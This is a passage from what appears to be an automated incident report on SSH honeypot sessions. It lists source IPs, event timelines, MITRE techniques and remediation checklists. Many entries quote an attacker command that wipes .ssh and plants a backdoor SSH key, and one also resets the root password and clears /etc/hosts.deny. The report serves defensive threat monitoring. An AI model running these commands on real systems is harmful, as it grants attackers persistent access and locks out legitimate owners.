| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:04:24` | `cowrie.session.connect` |
| `2026-04-14 10:04:24` | `cowrie.client.version` |
| `2026-04-14 10:04:24` | `cowrie.client.kex` |
| `2026-04-14 10:04:25` | `cowrie.login.success` |
| `2026-04-14 10:04:25` | `cowrie.session.params` |
| `2026-04-14 10:04:25` | `cowrie.command.input` |
| `2026-04-14 10:04:25` | `cowrie.command.failed` |
| `2026-04-14 10:04:25` | `cowrie.log.closed` |
| `2026-04-14 10:04:25` | `cowrie.session.params` |
| `2026-04-14 10:04:25` | `cowrie.command.input` |
| `2026-04-14 10:04:25` | `cowrie.session.file_download` |
| `2026-04-14 10:04:25` | `cowrie.log.closed` |
| `2026-04-14 10:04:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a026c5110da

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 10:04 |
| **Last Seen** | 2026-04-14 10:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:04:27` | `cowrie.session.connect` |
| `2026-04-14 10:04:27` | `cowrie.client.version` |
| `2026-04-14 10:04:27` | `cowrie.client.kex` |
| `2026-04-14 10:04:27` | `cowrie.login.success` |
| `2026-04-14 10:04:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0fbd66e65e8

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:05 |
| **Last Seen** | 2026-04-14 10:05 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:05:09` | `cowrie.session.connect` |
| `2026-04-14 10:05:09` | `cowrie.client.version` |
| `2026-04-14 10:05:09` | `cowrie.client.kex` |
| `2026-04-14 10:05:10` | `cowrie.login.success` |
| `2026-04-14 10:05:11` | `cowrie.session.params` |
| `2026-04-14 10:05:11` | `cowrie.command.input` |
| `2026-04-14 10:05:11` | `cowrie.command.failed` |
| `2026-04-14 10:05:11` | `cowrie.log.closed` |
| `2026-04-14 10:05:12` | `cowrie.session.params` |
| `2026-04-14 10:05:12` | `cowrie.command.input` |
| `2026-04-14 10:05:12` | `cowrie.session.file_download` |
| `2026-04-14 10:05:12` | `cowrie.log.closed` |
| `2026-04-14 10:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6055f8ab237e

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:05 |
| **Last Seen** | 2026-04-14 10:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:05:19` | `cowrie.session.connect` |
| `2026-04-14 10:05:19` | `cowrie.client.version` |
| `2026-04-14 10:05:19` | `cowrie.client.kex` |
| `2026-04-14 10:05:20` | `cowrie.login.success` |
| `2026-04-14 10:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d22f62f4354c

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 10:07 |
| **Last Seen** | 2026-04-14 10:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:07:43` | `cowrie.session.connect` |
| `2026-04-14 10:07:43` | `cowrie.client.version` |
| `2026-04-14 10:07:43` | `cowrie.client.kex` |
| `2026-04-14 10:07:43` | `cowrie.login.success` |
| `2026-04-14 10:07:44` | `cowrie.session.params` |
| `2026-04-14 10:07:44` | `cowrie.command.input` |
| `2026-04-14 10:07:44` | `cowrie.command.failed` |
| `2026-04-14 10:07:44` | `cowrie.log.closed` |
| `2026-04-14 10:07:44` | `cowrie.session.params` |
| `2026-04-14 10:07:44` | `cowrie.command.input` |
| `2026-04-14 10:07:44` | `cowrie.session.file_download` |
| `2026-04-14 10:07:44` | `cowrie.log.closed` |
| `2026-04-14 10:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4cfbfa3e978

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 10:07 |
| **Last Seen** | 2026-04-14 10:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:07:46` | `cowrie.session.connect` |
| `2026-04-14 10:07:46` | `cowrie.client.version` |
| `2026-04-14 10:07:46` | `cowrie.client.kex` |
| `2026-04-14 10:07:46` | `cowrie.login.success` |
| `2026-04-14 10:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35dc65d44b93

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:10 |
| **Last Seen** | 2026-04-14 10:11 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:mF9ky8iWhyDP"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:10:44` | `cowrie.session.connect` |
| `2026-04-14 10:10:44` | `cowrie.client.version` |
| `2026-04-14 10:10:45` | `cowrie.client.kex` |
| `2026-04-14 10:10:46` | `cowrie.login.success` |
| `2026-04-14 10:10:47` | `cowrie.session.params` |
| `2026-04-14 10:10:47` | `cowrie.command.input` |
| `2026-04-14 10:10:47` | `cowrie.command.failed` |
| `2026-04-14 10:10:47` | `cowrie.log.closed` |
| `2026-04-14 10:10:48` | `cowrie.session.params` |
| `2026-04-14 10:10:48` | `cowrie.command.input` |
| `2026-04-14 10:10:48` | `cowrie.session.file_download` |
| `2026-04-14 10:10:48` | `cowrie.log.closed` |
| `2026-04-14 10:10:57` | `cowrie.session.params` |
| `2026-04-14 10:10:57` | `cowrie.command.input` |
| `2026-04-14 10:10:58` | `cowrie.log.closed` |
| `2026-04-14 10:10:58` | `cowrie.session.params` |
| `2026-04-14 10:10:58` | `cowrie.command.input` |
| `2026-04-14 10:10:59` | `cowrie.log.closed` |
| `2026-04-14 10:10:59` | `cowrie.session.params` |
| `2026-04-14 10:10:59` | `cowrie.command.input` |
| `2026-04-14 10:11:00` | `cowrie.session.file_download` |
| `2026-04-14 10:11:00` | `cowrie.log.closed` |
| `2026-04-14 10:11:00` | `cowrie.session.params` |
| `2026-04-14 10:11:00` | `cowrie.command.input` |
| `2026-04-14 10:11:01` | `cowrie.log.closed` |
| `2026-04-14 10:11:01` | `cowrie.session.params` |
| `2026-04-14 10:11:01` | `cowrie.command.input` |
| `2026-04-14 10:11:02` | `cowrie.log.closed` |
| `2026-04-14 10:11:02` | `cowrie.session.params` |
| `2026-04-14 10:11:02` | `cowrie.command.input` |
| `2026-04-14 10:11:02` | `cowrie.command.input` |
| `2026-04-14 10:11:02` | `cowrie.log.closed` |
| `2026-04-14 10:11:03` | `cowrie.session.params` |
| `2026-04-14 10:11:03` | `cowrie.command.input` |
| `2026-04-14 10:11:03` | `cowrie.log.closed` |
| `2026-04-14 10:11:05` | `cowrie.session.params` |
| `2026-04-14 10:11:05` | `cowrie.command.input` |
| `2026-04-14 10:11:05` | `cowrie.log.closed` |
| `2026-04-14 10:11:06` | `cowrie.session.params` |
| `2026-04-14 10:11:06` | `cowrie.command.input` |
| `2026-04-14 10:11:06` | `cowrie.log.closed` |
| `2026-04-14 10:11:07` | `cowrie.session.params` |
| `2026-04-14 10:11:07` | `cowrie.command.input` |
| `2026-04-14 10:11:07` | `cowrie.log.closed` |
| `2026-04-14 10:11:08` | `cowrie.session.params` |
| `2026-04-14 10:11:08` | `cowrie.command.input` |
| `2026-04-14 10:11:08` | `cowrie.log.closed` |
| `2026-04-14 10:11:09` | `cowrie.session.params` |
| `2026-04-14 10:11:09` | `cowrie.command.input` |
| `2026-04-14 10:11:09` | `cowrie.log.closed` |
| `2026-04-14 10:11:10` | `cowrie.session.params` |
| `2026-04-14 10:11:10` | `cowrie.command.input` |
| `2026-04-14 10:11:10` | `cowrie.log.closed` |
| `2026-04-14 10:11:11` | `cowrie.session.params` |
| `2026-04-14 10:11:11` | `cowrie.command.input` |
| `2026-04-14 10:11:11` | `cowrie.log.closed` |
| `2026-04-14 10:11:12` | `cowrie.session.params` |
| `2026-04-14 10:11:12` | `cowrie.command.input` |
| `2026-04-14 10:11:12` | `cowrie.log.closed` |
| `2026-04-14 10:11:13` | `cowrie.session.params` |
| `2026-04-14 10:11:13` | `cowrie.command.input` |
| `2026-04-14 10:11:13` | `cowrie.log.closed` |
| `2026-04-14 10:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35cb1332dbb8

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 10:11 |
| **Last Seen** | 2026-04-14 10:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:11:02` | `cowrie.session.connect` |
| `2026-04-14 10:11:02` | `cowrie.client.version` |
| `2026-04-14 10:11:02` | `cowrie.client.kex` |
| `2026-04-14 10:11:03` | `cowrie.login.success` |
| `2026-04-14 10:11:03` | `cowrie.session.params` |
| `2026-04-14 10:11:03` | `cowrie.command.input` |
| `2026-04-14 10:11:03` | `cowrie.command.failed` |
| `2026-04-14 10:11:03` | `cowrie.log.closed` |
| `2026-04-14 10:11:03` | `cowrie.session.params` |
| `2026-04-14 10:11:03` | `cowrie.command.input` |
| `2026-04-14 10:11:03` | `cowrie.session.file_download` |
| `2026-04-14 10:11:03` | `cowrie.log.closed` |
| `2026-04-14 10:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05500d9de83a

| Field | Detail |
|---|---|
| **Source IP** | `103.147.211[.]2` |
| **First Seen** | 2026-04-14 10:11 |
| **Last Seen** | 2026-04-14 10:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:11:05` | `cowrie.session.connect` |
| `2026-04-14 10:11:05` | `cowrie.client.version` |
| `2026-04-14 10:11:05` | `cowrie.client.kex` |
| `2026-04-14 10:11:05` | `cowrie.login.success` |
| `2026-04-14 10:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.211[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.147.211[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef26a8181847

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 10:11 |
| **Last Seen** | 2026-04-14 10:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:11:48` | `cowrie.session.connect` |
| `2026-04-14 10:11:48` | `cowrie.client.version` |
| `2026-04-14 10:11:48` | `cowrie.client.kex` |
| `2026-04-14 10:11:49` | `cowrie.login.success` |
| `2026-04-14 10:11:50` | `cowrie.session.params` |
| `2026-04-14 10:11:50` | `cowrie.command.input` |
| `2026-04-14 10:11:50` | `cowrie.command.failed` |
| `2026-04-14 10:11:50` | `cowrie.log.closed` |
| `2026-04-14 10:11:50` | `cowrie.session.params` |
| `2026-04-14 10:11:50` | `cowrie.command.input` |
| `2026-04-14 10:11:51` | `cowrie.session.file_download` |
| `2026-04-14 10:11:51` | `cowrie.log.closed` |
| `2026-04-14 10:11:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fff4717fd66

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 10:11 |
| **Last Seen** | 2026-04-14 10:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:11:53` | `cowrie.session.connect` |
| `2026-04-14 10:11:53` | `cowrie.client.version` |
| `2026-04-14 10:11:53` | `cowrie.client.kex` |
| `2026-04-14 10:11:54` | `cowrie.login.success` |
| `2026-04-14 10:11:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ea81ec3a68

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:12 |
| **Last Seen** | 2026-04-14 10:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:12:36` | `cowrie.session.connect` |
| `2026-04-14 10:12:36` | `cowrie.client.version` |
| `2026-04-14 10:12:36` | `cowrie.client.kex` |
| `2026-04-14 10:12:37` | `cowrie.login.success` |
| `2026-04-14 10:12:38` | `cowrie.session.params` |
| `2026-04-14 10:12:38` | `cowrie.command.input` |
| `2026-04-14 10:12:38` | `cowrie.command.failed` |
| `2026-04-14 10:12:38` | `cowrie.log.closed` |
| `2026-04-14 10:12:39` | `cowrie.session.params` |
| `2026-04-14 10:12:39` | `cowrie.command.input` |
| `2026-04-14 10:12:39` | `cowrie.session.file_download` |
| `2026-04-14 10:12:39` | `cowrie.log.closed` |
| `2026-04-14 10:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cb9dc91d151

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:12 |
| **Last Seen** | 2026-04-14 10:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:12:45` | `cowrie.session.connect` |
| `2026-04-14 10:12:45` | `cowrie.client.version` |
| `2026-04-14 10:12:45` | `cowrie.client.kex` |
| `2026-04-14 10:12:46` | `cowrie.login.success` |
| `2026-04-14 10:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-575206171711

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 10:15 |
| **Last Seen** | 2026-04-14 10:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:15:04` | `cowrie.session.connect` |
| `2026-04-14 10:15:04` | `cowrie.client.version` |
| `2026-04-14 10:15:04` | `cowrie.client.kex` |
| `2026-04-14 10:15:05` | `cowrie.login.success` |
| `2026-04-14 10:15:06` | `cowrie.session.params` |
| `2026-04-14 10:15:06` | `cowrie.command.input` |
| `2026-04-14 10:15:06` | `cowrie.command.failed` |
| `2026-04-14 10:15:06` | `cowrie.log.closed` |
| `2026-04-14 10:15:06` | `cowrie.session.params` |
| `2026-04-14 10:15:06` | `cowrie.command.input` |
| `2026-04-14 10:15:07` | `cowrie.session.file_download` |
| `2026-04-14 10:15:07` | `cowrie.log.closed` |
| `2026-04-14 10:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-554b86c3a92c

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-14 10:15 |
| **Last Seen** | 2026-04-14 10:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
